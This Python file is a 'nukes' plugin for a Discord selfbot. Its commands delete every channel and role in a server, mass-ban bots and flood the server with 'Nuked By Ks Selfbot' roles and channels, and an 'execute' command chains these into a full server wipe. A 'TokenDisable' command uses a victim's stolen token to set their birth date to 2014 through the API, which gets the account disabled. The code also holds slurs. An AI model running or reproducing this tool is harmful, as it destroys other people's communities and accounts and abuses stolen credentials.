import discord
import asyncio
from discord.ext import commands
import requests
import json
from plugins.common import getheaders, proxy
class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKCYAN = '\033[96m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'
class nukes(commands.Cog):
  def __init__(self, bot):
    self.bot = bot
  reason="Ks Selfbot Nuked You!"
  @commands.command()
  async def massban(self, ctx):
    await ctx.message.delete()
    for user in ctx.guild.bots:
      try:
        await user.ban(reason = "Nuked By Ks Selfbot!")
      except Exception as e:
        print(f"[-]MASSBAN \n {e}")
        pass
  @commands.command(aliases = ["leave", "servergone", "servernuke", "sl", "leaveserver", "removeserver"])
  async def serverleave(self, ctx):
    await ctx.message.delete()
    for guild in self.bot.guilds:
      try:
        server = self.bot.get_guild(guild.id)
        await server.leave()
        print(bcolors.OKGREEN + f"Left server {self.bot.get_guild(guild.name)}")
      except Exception as e:
        print(e)
  @commands.command(aliases = ["friendremover", "friendkill", "fn", "friendnuker"])
  async def friendfuck(self, ctx):
    await ctx.message.delete()
    for friends in self.bot.user.friends:
      try:
        await friends.remove_friend()
      except Exception as e:
        print(e)
  @commands.command(aliases = ["purge", "delmsg", "msgfuck"])
  async def clean(self, ctx, limit: int):
    await ctx.channel.purge(limit=limit)

  @commands.command(aliases = ["rolespam", "createrole"])
  async def rolecreate(self, ctx):
    await ctx.message.delete()
    await ctx.send("Starting role creation..", delete_after = 0.5)
    await ctx.send("Please wait..", delete_after = 0.5)
    for i in range(1, 50):
      try:
        await ctx.guild.create_role(name=f"Nuked By Ks Selfbot!", color=discord.Color.random(), reason="Ks Selfbot Nuked You!")
        print(f"[-]ROLE\nMade role: {i}")
      except:
        print(f"[-]ROLE \nFailed to make role {i}!")
    else:
      await ctx.send("Failed to create role!")
      return

  @commands.command(aliases = ["channelcreate", "createchannel", "cc"])
  async def channelspam(self, ctx):
    await ctx.message.delete()
    await ctx.send("Starting channel creation..")
    await ctx.send("Please wait..")
    for i in range(1, 50):
      try:
        await ctx.guild.create_text_channel(name=f"nuked-by-ks-selfbot!", reason="Ks Selfbot Nuked You!")
        await ctx.guild.create_category(name=f"nuked by ks selfbot!", reason="Ks Selfbot Nuked You!")
        await ctx.guild.create_voice_channel(name=f"nuked by ks selfbot!", reason="Ks Selfbot Nuked You!")
        print(f"[-]CHANNEL\nMade Channels: {i}")
      except:
        print(f"[-]CHANNEL \nFailed to make channel {i}!")
  @commands.command()
  async def TokenDisable(self, ctx, token=None):
    await ctx.message.delete()
    if token == None:
      msg = await ctx.send("I need a token to disable retard")
      await ctx.message.delete(msg)
    res = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json={'date_of_birth': '2014-2-11'})

    if res.status_code == 400:
        res_message = res.json().get('date_of_birth', ['no response message'])[0]
        
        if res_message == "You need to be 13 or older in order to use Discord.":
          await ctx.send(f'\nToken successfully disabled!\n')
        elif res_message == "You cannot update your date of birth.":
          await ctx.send('Account can\'t be disabled')
        else:
          await ctx.send(f'Unknown response: {res_message}')
    else:
        print('Failed to disable account')

  @commands.command(aliases = ["vccreate", "createvc", "vc"])
  async def vcspam(self, ctx):
    await ctx.message.delete()
    await ctx.send("Starting voice chat creation..")
    await ctx.send("Please wait..")
    for i in range(1, 50):
      try:
        await ctx.guild.create_voice_channel(name=f"nuked by ks selfbot!", reason="Ks Selfbot Nuked You!")
        print(f"[-]VOICE\nMade VC: {i}")
      except:
        print(f"[-]VOICE \nFailed to make VC {i}!")

  @commands.command(aliases = ["categorycreate", "createcategory", "cs"])
  async def categoryspam(self, ctx):
    await ctx.message.delete()
    await ctx.send("Starting category creation..")
    await ctx.send("Please wait..")
    for i in range(1, 50):
      try:
        await ctx.guild.create_category(name=f"nuked by ks selfbot!", reason="Ks Selfbot Nuked You!")
        print(f"[-]CATEGORY\nMade Category: {i}")
      except:
        print(f"[-]CATEGORY \nFailed to make Category {i}!")

  @commands.command(aliases = ["channeldelete", "deletechannel", "channelfuck"])
  async def fuckchannel(self, ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
      try:
        await channel.delete(reason="Ks Selfbot Nuked You!")
        print(f"[-]CHANNEL\n DELETED {channel}")
      except:
        print(f"[-]CHANNEL\n Failed to delete {channel}")

  @commands.command(aliases = ["roledelete", "rf", "rd"])
  async def rolefuck(self, ctx):
    await ctx.message.delete()
    roles = ctx.guild.roles
    for role in roles:
      if ctx.guild.roles[-1] > role:
        try:
          await role.delete(reason="Ks Selfbot Nuked You!")
          print(f"[-]ROLEFUCK\nDeleted {role}")
        except:
          print(
          f"[-]ROLEFUCK \n Failed to delete role: {role}"
          )
  @commands.command()
  async def execute(self, ctx):
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
      if ctx.guild.roles[-1] > role:
        try:
          await role.delete(reason="Ks Selfbot Nuked You!")
          print(f"[-]ROLEFUCK\nDeleted {role}")
        except:
          print(f"[-]ROLEFUCK \n Failed to delete role: {role}")
    for i in range(0, 100):
      try:
        await ctx.guild.create_role(name="Nuked By ks#1000 Selfbot!", colour=discord.Colour.random(), reason="Ks Selfbot Nuked You!")
        print(f"[-]ROLESPAM \n Created role {i}")
      except:
        print(f"[-]ROLESPAM \n Error Creating role {i}")
    for channel in ctx.guild.channels:
      try:
        await channel.delete(reason="Ks Selfbot Nuked You!")
      except:
        print(f"[-]CHANNELFUCK \n Couldnt delete channel {channel}!")
    for i in range(0,100):
      try:
        await ctx.guild.create_text_channel(name = "ks-nuked-you", reason="Ks Selfbot Nuked You!")
        await ctx.guild.create_voice_channel(name = "Ks SelfbotW", reason="Ks Selfbot Nuked You!")
        await ctx.guild.create_category(name="Ks Selfbot Fucked You!", reason="Ks Selfbot Nuked You!")
        print(f"[-]CHANNELS \n channel loop executed {i} times!")
      except:
        print(f"[-]CHANNELS \n Error creating {channel}")
    print("Finished nuking!")
def setup(bot):
  bot.add_cog(nukes(bot))